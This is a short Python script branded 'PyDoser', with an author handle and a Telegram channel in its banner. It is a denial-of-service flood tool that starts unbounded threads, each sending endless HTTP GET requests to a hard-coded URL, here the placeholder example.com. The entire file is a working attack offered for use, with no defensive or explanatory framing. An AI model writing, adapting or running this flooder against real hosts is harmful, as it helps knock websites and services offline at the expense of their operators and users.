# coding: utf8

import threading
import requests

banner = """
 ____________________________________________________
|                                                    |
| [--] Name: PyDoser                                 |
|                                                    |
| [--] Created by: @c3berman                         |
|                                                    |
| [--] Telegram channel: @detectent                  |
|                                                    |
| [--] Version: 1.0.6                                |
|____________________________________________________|
"""

print(banner)

def dos():
 while True:
  requests.get("http://example.com")
  
while True:
 threading.Thread(target=dos).start()